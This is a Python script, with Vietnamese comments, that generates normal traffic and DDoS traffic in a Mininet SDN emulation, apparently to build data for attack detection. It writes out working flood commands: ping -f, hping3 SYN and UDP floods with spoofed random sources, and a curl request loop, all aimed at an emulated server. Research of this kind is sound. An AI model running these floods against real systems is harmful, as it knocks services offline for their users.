#!/usr/bin/env python3
"""
traffic.py - Generate normal and DDoS attack traffic
Sử dụng trong Mininet để tạo traffic patterns khác nhau
"""

import sys
import argparse
import random
import time
from datetime import datetime


class TrafficGenerator:
    """Traffic generator for SDN network"""
    
    def __init__(self, net):
        """
        Initialize traffic generator
        Args:
            net: Mininet network object
        """
        self.net = net
        self.hosts = net.hosts
        self.target = net.get('h9')  # Server target
        
    def generate_normal_traffic(self, duration=60, interval=1):
        """
        Tạo traffic bình thường
        - Ping requests với rate thấp
        - HTTP requests ngẫu nhiên
        
        Args:
            duration: Thời gian chạy (seconds)
            interval: Khoảng cách giữa các requests (seconds)
        """
        print(f"[+] Generating NORMAL traffic for {duration} seconds...")
        print(f"[+] Target: {self.target.IP()}")
        
        start_time = time.time()
        request_count = 0
        
        while time.time() - start_time < duration:
            # Chọn random host (không phải target)
            hosts = [h for h in self.hosts if h != self.target]
            host = random.choice(hosts)
            
            # Random loại traffic
            traffic_type = random.choice(['ping', 'http', 'iperf'])
            
            try:
                if traffic_type == 'ping':
                    # Ping với count nhỏ
                    count = random.randint(1, 3)
                    cmd = f'ping -c {count} -W 1 {self.target.IP()} > /dev/null 2>&1 &'
                    host.cmd(cmd)
                    request_count += count
                    
                elif traffic_type == 'http':
                    # Simulate HTTP request với wget
                    cmd = f'wget -q -O /dev/null --timeout=2 --tries=1 http://{self.target.IP()}:80/ > /dev/null 2>&1 &'
                    host.cmd(cmd)
                    request_count += 1
                    
                elif traffic_type == 'iperf':
                    # Short iperf test
                    cmd = f'iperf -c {self.target.IP()} -t 1 -b 100K > /dev/null 2>&1 &'
                    host.cmd(cmd)
                    request_count += 1
                
                print(f"[{datetime.now().strftime('%H:%M:%S')}] {host.name} -> {self.target.name} ({traffic_type})")
                
            except Exception as e:
                print(f"[!] Error: {e}")
            
            time.sleep(interval)
        
        print(f"\n[+] Normal traffic completed: {request_count} requests sent")
    
    def generate_icmp_flood(self, duration=30, attackers=None):
        """
        Tấn công ICMP Flood (Ping Flood)
        
        Args:
            duration: Thời gian tấn công (seconds)
            attackers: List các host tấn công, mặc định là h7, h8
        """
        if attackers is None:
            attackers = [self.net.get('h7'), self.net.get('h8')]
        
        print(f"\n[!] Launching ICMP FLOOD attack for {duration} seconds...")
        print(f"[!] Attackers: {[h.name for h in attackers]}")
        print(f"[!] Target: {self.target.IP()}")
        
        start_time = time.time()
        
        # Start flood từ mỗi attacker
        for attacker in attackers:
            # hping3 hoặc ping flood
            # Sử dụng ping với interval rất nhỏ và flood option
            cmd = f'timeout {duration} ping -f -s 1024 {self.target.IP()} > /dev/null 2>&1 &'
            attacker.cmd(cmd)
            print(f"[!] {attacker.name} attacking...")
        
        # Monitor attack
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            print(f"[{elapsed}s] Attack in progress... ({remaining}s remaining)", end='\r')
            time.sleep(1)
        
        print(f"\n[+] ICMP flood attack completed")
    
    def generate_syn_flood(self, duration=30, attackers=None):
        """
        Tấn công SYN Flood
        
        Args:
            duration: Thời gian tấn công (seconds)
            attackers: List các host tấn công
        """
        if attackers is None:
            attackers = [self.net.get('h7'), self.net.get('h8')]
        
        print(f"\n[!] Launching SYN FLOOD attack for {duration} seconds...")
        print(f"[!] Attackers: {[h.name for h in attackers]}")
        print(f"[!] Target: {self.target.IP()}:80")
        
        # Sử dụng hping3 nếu có, hoặc scapy
        for attacker in attackers:
            # hping3 SYN flood
            cmd = f'timeout {duration} hping3 -S -p 80 --flood --rand-source {self.target.IP()} > /dev/null 2>&1 &'
            attacker.cmd(cmd)
            print(f"[!] {attacker.name} attacking with SYN flood...")
        
        start_time = time.time()
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            print(f"[{elapsed}s] Attack in progress... ({remaining}s remaining)", end='\r')
            time.sleep(1)
        
        print(f"\n[+] SYN flood attack completed")
    
    def generate_udp_flood(self, duration=30, attackers=None):
        """
        Tấn công UDP Flood
        
        Args:
            duration: Thời gian tấn công (seconds)
            attackers: List các host tấn công
        """
        if attackers is None:
            attackers = [self.net.get('h7'), self.net.get('h8')]
        
        print(f"\n[!] Launching UDP FLOOD attack for {duration} seconds...")
        print(f"[!] Attackers: {[h.name for h in attackers]}")
        print(f"[!] Target: {self.target.IP()}")
        
        for attacker in attackers:
            # hping3 UDP flood
            cmd = f'timeout {duration} hping3 --udp -p 53 --flood --rand-source {self.target.IP()} > /dev/null 2>&1 &'
            attacker.cmd(cmd)
            print(f"[!] {attacker.name} attacking with UDP flood...")
        
        start_time = time.time()
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            print(f"[{elapsed}s] Attack in progress... ({remaining}s remaining)", end='\r')
            time.sleep(1)
        
        print(f"\n[+] UDP flood attack completed")
    
    def generate_http_flood(self, duration=30, attackers=None):
        """
        Tấn công HTTP Flood
        
        Args:
            duration: Thời gian tấn công (seconds)
            attackers: List các host tấn công
        """
        if attackers is None:
            attackers = [self.net.get('h7'), self.net.get('h8')]
        
        print(f"\n[!] Launching HTTP FLOOD attack for {duration} seconds...")
        print(f"[!] Attackers: {[h.name for h in attackers]}")
        print(f"[!] Target: http://{self.target.IP()}/")
        
        for attacker in attackers:
            # Sử dụng ab (Apache Bench) hoặc curl loop
            cmd = f'timeout {duration} bash -c "while true; do curl -s http://{self.target.IP()}/ > /dev/null; done" &'
            attacker.cmd(cmd)
            print(f"[!] {attacker.name} attacking with HTTP flood...")
        
        start_time = time.time()
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            print(f"[{elapsed}s] Attack in progress... ({remaining}s remaining)", end='\r')
            time.sleep(1)
        
        print(f"\n[+] HTTP flood attack completed")
    
    def generate_mixed_attack(self, duration=60):
        """
        Tấn công kết hợp nhiều loại
        
        Args:
            duration: Thời gian tấn công (seconds)
        """
        print(f"\n[!] Launching MIXED attack for {duration} seconds...")
        
        attackers = [self.net.get('h7'), self.net.get('h8')]
        segment = duration // 3
        
        # ICMP flood
        print("\n--- Phase 1: ICMP Flood ---")
        self.generate_icmp_flood(segment, attackers[:1])
        
        # SYN flood
        print("\n--- Phase 2: SYN Flood ---")
        self.generate_syn_flood(segment, attackers[1:])
        
        # UDP flood
        print("\n--- Phase 3: UDP Flood ---")
        self.generate_udp_flood(segment, attackers)
        
        print(f"\n[+] Mixed attack completed")


def run_traffic_scenario(net, scenario='normal'):
    """
    Chạy traffic scenario
    
    Args:
        net: Mininet network
        scenario: 'normal', 'icmp', 'syn', 'udp', 'http', 'mixed', 'full'
    """
    generator = TrafficGenerator(net)
    
    if scenario == 'normal':
        print("\n=== SCENARIO: Normal Traffic ===")
        generator.generate_normal_traffic(duration=120, interval=2)
        
    elif scenario == 'icmp':
        print("\n=== SCENARIO: ICMP Flood Attack ===")
        generator.generate_normal_traffic(duration=30, interval=2)
        generator.generate_icmp_flood(duration=60)
        generator.generate_normal_traffic(duration=30, interval=2)
        
    elif scenario == 'syn':
        print("\n=== SCENARIO: SYN Flood Attack ===")
        generator.generate_normal_traffic(duration=30, interval=2)
        generator.generate_syn_flood(duration=60)
        generator.generate_normal_traffic(duration=30, interval=2)
        
    elif scenario == 'udp':
        print("\n=== SCENARIO: UDP Flood Attack ===")
        generator.generate_normal_traffic(duration=30, interval=2)
        generator.generate_udp_flood(duration=60)
        generator.generate_normal_traffic(duration=30, interval=2)
        
    elif scenario == 'http':
        print("\n=== SCENARIO: HTTP Flood Attack ===")
        generator.generate_normal_traffic(duration=30, interval=2)
        generator.generate_http_flood(duration=60)
        generator.generate_normal_traffic(duration=30, interval=2)
        
    elif scenario == 'mixed':
        print("\n=== SCENARIO: Mixed Attack ===")
        generator.generate_normal_traffic(duration=30, interval=2)
        generator.generate_mixed_attack(duration=90)
        generator.generate_normal_traffic(duration=30, interval=2)
        
    elif scenario == 'full':
        print("\n=== SCENARIO: Full Test (All Attack Types) ===")
        
        # Normal traffic
        print("\n>>> Collecting NORMAL traffic...")
        generator.generate_normal_traffic(duration=120, interval=1)
        time.sleep(10)
        
        # ICMP attack
        print("\n>>> Testing ICMP flood...")
        generator.generate_icmp_flood(duration=60)
        time.sleep(10)
        
        # Normal again
        generator.generate_normal_traffic(duration=60, interval=1)
        time.sleep(10)
        
        # SYN attack
        print("\n>>> Testing SYN flood...")
        generator.generate_syn_flood(duration=60)
        time.sleep(10)
        
        # Normal again
        generator.generate_normal_traffic(duration=60, interval=1)
        time.sleep(10)
        
        # UDP attack
        print("\n>>> Testing UDP flood...")
        generator.generate_udp_flood(duration=60)
        time.sleep(10)
        
        # Final normal traffic
        generator.generate_normal_traffic(duration=60, interval=1)
        
        print("\n[+] Full test scenario completed!")
    
    else:
        print(f"[!] Unknown scenario: {scenario}")
        print("Available scenarios: normal, icmp, syn, udp, http, mixed, full")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SDN Traffic Generator')
    parser.add_argument('--scenario', type=str, default='normal',
                       choices=['normal', 'icmp', 'syn', 'udp', 'http', 'mixed', 'full'],
                       help='Traffic scenario to run')
    
    args = parser.parse_args()
    
    print("This script should be imported and used within Mininet environment")
    print(f"Selected scenario: {args.scenario}")
